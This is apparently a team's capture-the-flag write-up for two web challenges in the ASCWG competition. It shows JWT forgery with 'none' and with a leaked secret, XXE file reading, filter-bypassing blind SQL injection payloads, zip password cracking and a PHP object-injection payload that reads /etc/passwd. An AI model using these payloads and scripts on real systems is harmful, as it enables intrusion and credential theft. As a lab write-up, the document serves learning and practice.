# ASCWG
Arabs Security Cyber Wargames

This CTF I joined with my team **champions** and scored rank 22nd

Team members:
  - Mohamed Saleh
  - Hussein Elsayed
  - Abanob Medhat
  - Waleed Negm

![image 1](https://imgur.com/7Zksa6v.png)

Enjoy the write-ups :D



# Promotion

## Description:

    "title": "promotion"
    "level": 1
    "description": "Find a way to promote yourself."
    "points": 300
    
  
## Enumerartion    

  Once I opened the challenge, I found this page.
  
  ![image 1](https://imgur.com/NggfgAv.png)

  
  I ran directory brute force scan while investigating the website
  
  ```./dirsearch.py dir -t 10 -u http://35.238.219.24/Promotion/ -e=php,elf,sh,bak,bak1,BAK,html,zip,rar,gz,log```

  
  I checked the source of the page, found nothing important
  
  So I checked the request and response

  ![image 2](https://imgur.com/U4orHzg.png)



  Here's something to look at, I found a **jwt token** in cookies
  
  ```
  auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoidXNlciJ9.j4ufWJ8PebEKIi5R7HSxu4s0cxucJYQivWfuQJ0ijTY
  ```

  Let's see what it hiddes using [https://jwt.io/](https://jwt.io/)

  ![image 3](https://imgur.com/bsJJ53D.png)

  As you see the algorithm used in the token is HS256 and the data inside it ```{role:user}```
  
  We didn't have the signature so We tried to bypass it with couple ways I'll try to mention them in brief:

  1. changing the algorithm value to "none" and role to "admin" removing the sigature part from jwt so It'll look like that. ```eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiYWRtaW4ifQ.```
  2. Brute force the signature secret key value .
  
  None of them worked, I tried to look for any other bypass but found none.



  I returned to the brute force result, and found somethings that may be interesting

  ![image 4](https://imgur.com/uHBkoBv.png)


  I checked them all and here's what I got:
  
  - /.ssh/ and /vendors/ directories require authorization to access, I tried to bypass the authorization with removing the cookie or changing the request method but none worked
  - most of the files inside /vendor/ directory are empty or worthless
  - /login.php doesn't have any content before redirecting and seems to need an authorization to access too
  - The one only thing that got me interested is /composer.lock it had the name and version of the software encrypting and decrypting the jwt token
  
  ![image 5](https://imgur.com/Gegmp78.png)
  
  I searched for any vulnerabilities for it but seemed to be up to date and didn't find any known vulnerabilities..

  
  That's the point where I got stuck, I asked organizers for hint and they told me to look at the Accept header which its value was more than normal to me *at first*..
  
  ```Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8```
  
  I spent a lot of time thinking about what would it be till I noticed *xhtml xml xml*..
  
  ***It's XML External Entity!!***
  
  I found this part hard to notice without the hint what makes this challenge deserved more points
## Exploitation
  
  I tried some payloads and one of them worked.
  
  ![image 6](https://imgur.com/wDPh3E1.png)


  I don't know the path to the web server directory, It was not the default /var/www/html/Promotion/ so I used another payload to read the index.php file.
  
  ![image 7](https://i.imgur.com/QhmeZrS.png)

  I decrypted it and found the **signature secret key** ```W3lc0me_T0_Ar@b_S3cur1ty_Cyber_W@r_G@me```

  
  
  Now it's time to get admin's cookies, going back to [jwt.io](https://jwt.io) and encrypting the key again after changing the role to admin and setting the signature secret key to the one we found
  
  and we got it: ```eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiYWRtaW4ifQ.2mlLS1yk38AxRHTLhPxJWgPgESUDk40kjg1z9oi3qec```

  
  Now let's change the auth cookie value and go to see other directories and files we couldn't access before
  
  /vendors/ and /.ssh/ were still unauthorized but /login.php gave us a login form

  
  I used the same XXE payload to get the **login.php** source code and found that it makes **SQL query** with the username and password and apply some filters for them
  
  ![image 8](https://imgur.com/hSISwlB.png)

  
  It's obvious we're going to make **sql injection**.
  
  But to bypass this filter there's some points to take in consideration:
  
  - the filter uses preg_replace() to remove specified strings.
  - the space can be replaced with tab which we'll write as %09.
  - the multi character strings can be bypassed by spliting them by itself or other string that's going to be removed after it e.g. (admadminin, passwo-rd).


  First I tried to bypass the login and using this payload ```adm-in')%09o-r%091=1#```
  
  ![image 9](https://imgur.com/0gRi8SS.png)

  I got ***welcome admin*** message.
  
  As you see there's no reflected value, It's blind SQL injection..

  
  Sending the request to intruder and preparing to brute force to get the length of the password
  
  Payload used : ```adm-in')%09an-d%09CHAR_LENGTH(passwo-rd)=§1§#```
  
  Payload values : numbers 1-100
  
  ![image 10](https://imgur.com/Xt6eASm.png)
  
  The length is: 26

  
  Another brute force to get the the password value with this payload ```adm-in')%09an-d%09SUBSTR(passwo-rd,§1§,1)='§1§'#```
  
  the first variable: iterating from 1 to 26
  
  the second variable: characters from a-z,numbers 0-9, special caracters !@#$%^&*(){}[]_-+= 
  
  ![image 11](https://imgur.com/zoK1jeE.png)
  
  The Password: ascwg{cr4ck!ng_!$_pa1nful}

  
  Despite we got the password, But the letters case was wrong
  
  So I made another brute force to get the right case by comparing the ascii number *maybe there was another better way but I didn't have time to think of another thing as the competetion was about to end*
  
  payload: adm-in')%09an-d%09ASCII(SUBSTR(passwo-rd,§1§,1))>=97#
  
  this means return true if the letter is lowercase
  
  ![image 12](https://imgur.com/rRxq26y.png)
  
  The password: ASCWG{Cr4cK!nG_!$_Pa1nful}
    
  ![image 13](https://imgur.com/JRx5OLe.png)

  
  
  Big credits to My teammate Abanob Medhat who cooperated with me in solving this challenge.
  
  And special thanks to the organizer Mohamed Bahaa who helped us to get through this challenge.
  
  # Translator

## Description

    "title": "Translator"
    "level": 2
    "description": "The only way to patch a vulnerability is by exposing it first so, Will you can Translator ?."
    "points": 600
    
## Enumeration

  I went to the website and made directory brute force scan, Checked the source code.. nothing seems to be important.
  
  I checked the request and response, but still nothing important
  
  I returned to see what the directory brute force found and it got **two paths that** shined with some hope to find something important.
  
  ![image 1](https://imgur.com/uDx6SiR.png)

  
  Both directories gave 403 unauthorized response
  
  At least maybe another brute force on them could reveal something.. and yes it did.
  
  We found a zip file inside backup directory.
  
  ![image 2](https://imgur.com/XBev9nz.png)

  
  Downloaded the file and tried to unzip it but it requires password, peace of cake.
  
  Running a small program to brute force the password was enough
  
  ```fcrackzip -v -u -D -p backup.zip rockyou.txt```
  
  ![image 3](https://imgur.com/PtpMSmw.png)
  
  The password: ```kaylaanne```

  
  Unzipped the file and it contained the source code of the index.php page.

```
<?php

function encryptString($plaintext, $password) {
//This is s3cr3t
}


function decryptString($ciphertext, $password) {
    $ciphertext = base64_decode($ciphertext);
    if (!hash_equals(hash_hmac('sha256', substr($ciphertext, 48).substr($ciphertext, 0, 16), hash('sha256', $password, true), true), substr($ciphertext, 16, 32))) return null;
    return openssl_decrypt(substr($ciphertext, 48), "AES-256-CBC", hash('sha256', $password, true), OPENSSL_RAW_DATA, substr($ciphertext, 0, 16));
}

//$EncString = encryptString("aaaaaaaaaaaaaaaaaaaaa", "vmUeu7D9bzE5JmNE"); output:SElIT1dBUkVZT1VCUk8hIdk8ZHn/lvhO9Vammhqvg8N6OlV2KOX3uRiQ7gsn8ZXuvE4UUPOK9Q4ZhufvCiyXhAIdJxY+22Rt5AgkVy0CDcI=

class ReadListLogs
{
        private $FileName = "/var/log/httpd/access_log";
        private $RowNumber = 1;

    public function __construct()
    {
      echo "__construct";
      $this->ReadSave($this->FileName, $this->RowNumber);
    }

    public function __wakeup()
    {
      $this->ReadSave($this->FileName, $this->RowNumber);
    }

    function ReadSave($FileName,$RowNumber)
        {
        $this->FileName = $FileName;
        $this->RowNumber = $RowNumber;
        $array = explode("\n", file_get_contents($FileName));
        $reversed = array_reverse($array);
        $File_Contnet = $reversed[$RowNumber];
              $stringxx = bin2hex(random_bytes(18));
        file_put_contents(__DIR__.'/logs/'.$stringxx.".txt", $File_Contnet);
            echo "End $stringxx";
        }
}



$data = json_decode(file_get_contents('php://input'));
$DecryptVal =  strval(decryptString($data->user,"vmUeu7D9bzE5JmNE"));
unserialize($DecryptVal);

?>
```
  Taking a look at what the code do:
  
  - Unreaveled encryption function that takes plain text and key
  - Revealed decrypting function that takes cipher text and key
  - A sample of the encrypting
  
  After them there's a class which contains:
  
  - Two variables $FileName and $RowNumber
  - __construct and __wakeup php magic methods, these are method that run without calling them when some action happens you can read about them ![here}(https://www.php.net/manual/en/language.oop5.magic.php)
  - A function to read files and store the output in file with random name in logs directory
  - Echoes the file name

  And the last portion of the code does the following:

  1. Gets the data from the request
  2. Decode the json formatted data
  3. Store the data to variable named $data
  4. Decrypting the parameter user in variable data with the decrypting function
  5. Storing the decrypted cipher to a variable named $DecryptVal
  6. Unserializing $DecryptVal

## Exploitation

  It's clear since the code has magic methods and unserializing user data that it'll be php insecure deserialization ( aka php object injection ).

  Ok let's take it step by step.

  ### 1. Serializing
  
  Since the data is unserialized we need to supply serialize .
  
  I made a small php script to serialize the data and make object of the same class with the same variables but changing thier values.
```
<?php
class ReadListLogs
{
        public function __construct()
        {
                $this->filename="/etc/passwd";
                $this->RowNumber = 1;
        }
}
$obj = new ReadListLogs();
echo serialize($obj);
echo "\n";
?>
```
  ![image 4](https://imgur.com/TiOTXI1.png)
  
  ```O:12:"O:12:"ReadListLogs":2:{s:8:"FileName";s:11:"/etc/passwd";s:9:"RowNumber";i:1;}```
  
  And we got the serialized payload..


  ### 2. Encrypting
  
  Here was a great problem for me, I thought at first it depended on cryptography, but it seemed at last it's OSINT.
  
  I searched for a long time for the algorithm until I finally found it [here](https://stackoverflow.com/questions/3422759/php-aes-encrypt-decrypt/56856924#answer-62175221)
  
  Ok now I have the encryption algorithm.

```
function encryptString($plaintext, $password) {
    $iv = openssl_random_pseudo_bytes(16);
    $ciphertext = openssl_encrypt($plaintext, "AES-256-CBC", hash('sha256', $password, true), OPENSSL_RAW_DATA, $iv);
    $hmac = hash_hmac('sha256', $ciphertext . $iv, hash('sha256', $password, true), true);
    return base64_encode($iv.$hmac.$ciphertext);
}
```

  I modified it a bit so I can use it in a local web server.
```
<?php

$password="vmUeu7D9bzE5JmNE";
$data=json_decode(file_get_contents('php://input'));
$plaintext=$data->user;

function encryptString($plaintext, $password) {
    $iv = openssl_random_pseudo_bytes(16);
    $ciphertext = openssl_encrypt($plaintext, "AES-256-CBC", hash('sha256', $password, true), OPENSSL_RAW_DATA, $iv);
    $hmac = hash_hmac('sha256', $ciphertext . $iv, hash('sha256', $password, true), true);
    return base64_encode($iv.$hmac.$ciphertext);
}

echo encryptString($plaintext,$password);

?>
```
  ![image 5](https://imgur.com/f2fU0IL.png)

  Also try to decrypt it locally with some reflective data added.

  ![image 6](https://imgur.com/tr3ZaEg.png)

  Encrypting done.



  ### 3. Injecting

  The encrypted serialized payload:

  ```NB8zli9U94QIB9lOosT0vaPVSakMB8vc7QTXEmJ4e9x9g4ah84ImLkFSdW1zHba5EEQvLzTNYXHkQocwb7ejsTTnEOU5maOkPW2fnMz6o2LPQZrnxe3rhh5A8Wh2g6pwqC6Nq7ZODfPPdMmfaTVMVh+iklUFeteJL9VOW27yLik=```

  Injecting it into the challenge.
  
  ![image 7](https://imgur.com/6y5ikh0.png)

  We got our lucky number for the file: 31771b107da808662fa1

  ![image 8](https://imgur.com/lhpz84I.png)

  Going to the file.

  ![https://imgur.com/beS5w18.png](https://imgur.com/beS5w18.png)

  And we got the flag: ```ASCWG{php_1$_R3a11y_C0Ol_1$_not_1t_?x?:P_1xcxz}```

  Note: I kept on increasing RowNumber value till I reached the line of the flag



  Big credits to my teammate Abanob Medhat who participated with me in solving this challenge


